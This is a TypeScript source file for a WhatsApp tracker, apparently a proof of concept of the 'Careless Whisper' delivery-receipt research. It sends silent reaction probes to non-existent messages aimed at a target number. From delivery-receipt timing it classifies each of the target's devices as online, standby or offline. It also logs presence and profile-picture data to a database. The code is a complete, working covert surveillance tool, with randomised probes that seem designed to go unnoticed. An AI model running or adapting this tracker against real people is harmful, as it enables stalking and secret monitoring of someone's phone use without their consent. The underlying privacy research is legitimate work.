import '@whiskeysockets/baileys';
import { WASocket, proto } from '@whiskeysockets/baileys';
import { pino } from 'pino';
import { db } from './database';

const logger = pino({ level: 'debug' });

/**
 * Metrics tracked per device for activity monitoring
 */
interface DeviceMetrics {
    rttHistory: number[];      // Historical RTT measurements (up to 2000)
    recentRtts: number[];      // Recent RTTs for moving average (last 3)
    state: string;             // Current device state (Online/Standby/Calibrating/Offline)
    lastRtt: number;           // Most recent RTT measurement
    lastUpdate: number;        // Timestamp of last update
}

/**
 * WhatsAppTracker - Monitors messaging app user activity using RTT-based analysis
 *
 * This class implements a privacy research proof-of-concept that demonstrates
 * how messaging apps can leak user activity information through network timing.
 *
 * The tracker sends probe messages and measures Round-Trip Time (RTT) to detect
 * when a user's device is actively in use vs. in standby mode.
 *
 * Works with WhatsApp, Signal, and similar messaging platforms.
 *
 * Based on research: "Careless Whisper: Exploiting Silent Delivery Receipts to Monitor Users"
 * by Gegenhuber et al., University of Vienna & SBA Research
 */
export class WhatsAppTracker {
    private sock: WASocket;
    private targetJid: string;
    private trackedJids: Set<string> = new Set(); // Multi-device support
    private isTracking: boolean = false;
    private deviceMetrics: Map<string, DeviceMetrics> = new Map();
    private globalRttHistory: number[] = []; // For threshold calculation
    private probeStartTimes: Map<string, number> = new Map();
    private probeTimeouts: Map<string, NodeJS.Timeout> = new Map();
    private lastPresence: string | null = null;
    public onUpdate?: (data: any) => void;

    constructor(sock: WASocket, targetJid: string) {
        this.sock = sock;
        this.targetJid = targetJid;
        this.trackedJids.add(targetJid);
    }

    /**
     * Start tracking the target user's activity
     * Sets up event listeners for message receipts and presence updates
     */
    public async startTracking() {
        if (this.isTracking) return;
        this.isTracking = true;
        logger.info(`Starting tracking for ${this.targetJid}`);

        // Listen for message updates (receipts)
        this.sock.ev.on('messages.update', (updates) => {
            for (const update of updates) {
                // Check if update is from any of the tracked JIDs (multi-device support)
                if (update.key.remoteJid && this.trackedJids.has(update.key.remoteJid) && update.key.fromMe) {
                    this.analyzeUpdate(update);
                }
            }
        });

        // Listen for presence updates
        this.sock.ev.on('presence.update', (update) => {
            console.log('[PRESENCE] Raw update received:', JSON.stringify(update, null, 2));

            if (update.presences) {
                for (const [jid, presenceData] of Object.entries(update.presences)) {
                    if (presenceData && presenceData.lastKnownPresence) {
                        // Track multi-device JIDs (including LID)
                        this.trackedJids.add(jid);
                        console.log(`[MULTI-DEVICE] Added JID to tracking: ${jid}`);

                        this.lastPresence = presenceData.lastKnownPresence;
                        console.log(`[PRESENCE] Stored presence from ${jid}: ${this.lastPresence}`);
                        break;
                    }
                }
            }
        });

        // Subscribe to presence updates
        try {
            await this.sock.presenceSubscribe(this.targetJid);
            console.log(`[PRESENCE] Successfully subscribed to presence for ${this.targetJid}`);
            console.log(`[MULTI-DEVICE] Currently tracking JIDs: ${Array.from(this.trackedJids).join(', ')}`);
        } catch (err) {
            console.error('[PRESENCE] Error subscribing to presence:', err);
        }

        // Send initial state update
        if (this.onUpdate) {
            this.onUpdate({
                devices: [],
                deviceCount: this.trackedJids.size,
                presence: this.lastPresence,
                median: 0,
                threshold: 0
            });
        }

        // Start the probe loop
        this.probeLoop();
    }

    private async probeLoop() {
        while (this.isTracking) {
            try {
                await this.sendProbe();
            } catch (err) {
                logger.error(err, 'Error sending probe');
            }
            const delay = Math.floor(Math.random() * 100) + 2000;
            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }

    /**
     * Send a probe message to measure RTT
     * Uses a reaction to a non-existent message to minimize user disruption
     */
    private async sendProbe() {
        try {
            // Generate a random message ID that likely doesn't exist
            const prefixes = ['3EB0', 'BAE5', 'F1D2', 'A9C4', '7E8B', 'C3F9', '2D6A'];
            const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            const randomSuffix = Math.random().toString(36).substring(2, 10).toUpperCase();
            const randomMsgId = randomPrefix + randomSuffix;

            // Randomize reaction emoji
            const reactions = ['👍', '❤️', '😂', '😮', '😢', '🙏', '👻', '🔥', '✨', ''];
            const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];

            const reactionMessage = {
                react: {
                    text: randomReaction,
                    key: {
                        remoteJid: this.targetJid,
                        fromMe: false,
                        id: randomMsgId
                    }
                }
            };

            console.log(`[PROBE] Sending probe with reaction "${randomReaction}" to non-existent message ${randomMsgId}`);
            const result = await this.sock.sendMessage(this.targetJid, reactionMessage);
            const startTime = Date.now();

            if (result?.key?.id) {
                console.log(`[PROBE] Probe sent successfully, message ID: ${result.key.id}`);
                this.probeStartTimes.set(result.key.id, startTime);
            } else {
                console.log('[PROBE ERROR] Failed to get message ID from send result');
            }
        } catch (err) {
            logger.error(err, '[PROBE ERROR] Failed to send probe message');
        }
    }

    /**
     * Analyze message update and calculate RTT
     * @param update Message update from WhatsApp
     */
    private analyzeUpdate(update: { key: proto.IMessageKey, update: Partial<proto.IWebMessageInfo> }) {
        const status = update.update.status;
        const msgId = update.key.id;
        const fromJid = update.key.remoteJid;

        if (!msgId || !fromJid) return;

        console.log(`[TRACKING] Message Update - ID: ${msgId}, JID: ${fromJid}, Status: ${status} (${this.getStatusName(status)})`);

        if (status === 3) { // CLIENT ACK
            const startTime = this.probeStartTimes.get(msgId);

            if (startTime) {
                const rtt = Date.now() - startTime;
                console.log(`[TRACKING] ✅ CLIENT ACK received for ${msgId} from ${fromJid}, RTT: ${rtt}ms`);

                // Clear timeout
                const timeoutId = this.probeTimeouts.get(msgId);
                if (timeoutId) {
                    clearTimeout(timeoutId);
                    this.probeTimeouts.delete(msgId);
                }

                this.probeStartTimes.delete(msgId);
                this.addMeasurementForDevice(fromJid, rtt);
            } else {
                console.log(`[TRACKING] ⚠️ CLIENT ACK for ${msgId} from ${fromJid} but no start time found (not our probe or already processed)`);
            }
        }
    }

    private getStatusName(status: number | null | undefined): string {
        switch (status) {
            case 0: return 'ERROR';
            case 1: return 'PENDING';
            case 2: return 'SERVER_ACK';
            case 3: return 'DELIVERY_ACK';
            case 4: return 'READ';
            case 5: return 'PLAYED';
            default: return 'UNKNOWN';
        }
    }

    /**
     * Add RTT measurement for a specific device and update its state
     * @param jid Device JID
     * @param rtt Round-trip time in milliseconds
     */
    private addMeasurementForDevice(jid: string, rtt: number) {
        // Initialize device metrics if not exists
        if (!this.deviceMetrics.has(jid)) {
            this.deviceMetrics.set(jid, {
                rttHistory: [],
                recentRtts: [],
                state: 'Calibrating...',
                lastRtt: rtt,
                lastUpdate: Date.now()
            });
        }

        const metrics = this.deviceMetrics.get(jid)!;
        const previousState = metrics.state;

        if (rtt <= 5000) {
            // 1. Add to device's recent RTTs for moving average (last 3)
            metrics.recentRtts.push(rtt);
            if (metrics.recentRtts.length > 3) {
                metrics.recentRtts.shift();
            }

            // 2. Add to device's history for calibration (last 50), filtering outliers > 5000ms
            metrics.rttHistory.push(rtt);
            if (metrics.rttHistory.length > 2000) {
                metrics.rttHistory.shift();
            }

            // 3. Add to global history for global threshold calculation
            this.globalRttHistory.push(rtt);
            if (this.globalRttHistory.length > 2000) {
                this.globalRttHistory.shift();
            }

            metrics.lastRtt = rtt;
        } else {
            // RTT > 5000ms indicates device is OFFLINE
            metrics.lastRtt = rtt;
            metrics.state = 'OFFLINE';
            console.log(`[DEVICE ${jid}] RTT: ${rtt}ms > 5000ms - Marking as OFFLINE`);
        }
        metrics.lastUpdate = Date.now();

        this.determineDeviceState(jid);

        // Write to database
        db.writeRTT(this.targetJid, rtt, metrics.state, jid).catch(err =>
            logger.error(err, 'Failed to write RTT to database')
        );

        // Write state change if state changed
        if (previousState !== metrics.state) {
            db.writeStateChange(this.targetJid, previousState, metrics.state, jid).catch(err =>
                logger.error(err, 'Failed to write state change to database')
            );
        }

        this.sendUpdate();
    }

    /**
     * Determine device state (Online/Standby/Offline) based on RTT analysis
     * @param jid Device JID
     */
    private determineDeviceState(jid: string) {
        const metrics = this.deviceMetrics.get(jid);
        if (!metrics) return;

        // If marked OFFLINE due to high RTT (> 5000ms), keep that state
        // Note: We only stay in OFFLINE if the CURRENT RTT is still > 5000ms
        if (metrics.state === 'OFFLINE' && metrics.lastRtt > 5000) {
            console.log(`[DEVICE ${jid}] Maintaining OFFLINE state (RTT: ${metrics.lastRtt}ms)`);
            return;
        }

        // Calculate device's moving average
        const movingAvg = metrics.recentRtts.reduce((a: number, b: number) => a + b, 0) / metrics.recentRtts.length;

        // Calculate global median and threshold
        let median = 0;
        let threshold = 0;

        if (this.globalRttHistory.length >= 3) {
            const sorted = [...this.globalRttHistory].sort((a, b) => a - b);
            const mid = Math.floor(sorted.length / 2);
            median = sorted.length % 2 !== 0 ? sorted[mid] : (sorted[mid - 1] + sorted[mid]) / 2;


            threshold = median * 0.9;

            if (movingAvg < threshold) {
                metrics.state = 'An (Online)';
            } else {
                metrics.state = 'Standby';
            }
        } else {
            metrics.state = 'Calibrating...';
        }

        console.log(`[DEVICE ${jid}] RTT: ${metrics.lastRtt}ms | Avg(3): ${movingAvg.toFixed(0)}ms | Global Median: ${median.toFixed(0)}ms | Threshold: ${threshold.toFixed(0)}ms | State: ${metrics.state}`);
    }

    /**
     * Send update to client with current tracking data
     */
    private sendUpdate() {
        // Build devices array
        const devices = Array.from(this.deviceMetrics.entries()).map(([jid, metrics]) => ({
            jid,
            state: metrics.state,
            rtt: metrics.lastRtt,
            avg: metrics.recentRtts.length > 0
                ? metrics.recentRtts.reduce((a: number, b: number) => a + b, 0) / metrics.recentRtts.length
                : 0
        }));

        // Calculate global stats for backward compatibility
        const globalMedian = this.calculateGlobalMedian();
        const globalThreshold = globalMedian * 0.9;

        const data = {
            devices,
            deviceCount: this.trackedJids.size,
            presence: this.lastPresence,
            // Global stats for charts
            median: globalMedian,
            threshold: globalThreshold
        };

        if (this.onUpdate) {
            this.onUpdate(data);
        }
    }

    /**
     * Calculate global median RTT across all measurements
     * @returns Median RTT value
     */
    private calculateGlobalMedian(): number {
        if (this.globalRttHistory.length < 3) return 0;

        const sorted = [...this.globalRttHistory].sort((a, b) => a - b);
        const mid = Math.floor(sorted.length / 2);
        return sorted.length % 2 !== 0 ? sorted[mid] : (sorted[mid - 1] + sorted[mid]) / 2;
    }

    /**
     * Get profile picture URL for the target user
     * @returns Profile picture URL or null if not available
     */
    public async getProfilePicture() {
        try {
            return await this.sock.profilePictureUrl(this.targetJid, 'image');
        } catch (err) {
            return null;
        }
    }

    /**
     * Stop tracking and clean up resources
     */
    public stopTracking() {
        this.isTracking = false;

        // Clear all pending timeouts
        for (const timeoutId of this.probeTimeouts.values()) {
            clearTimeout(timeoutId);
        }
        this.probeTimeouts.clear();
        this.probeStartTimes.clear();

        logger.info('Stopping tracking');
    }
}
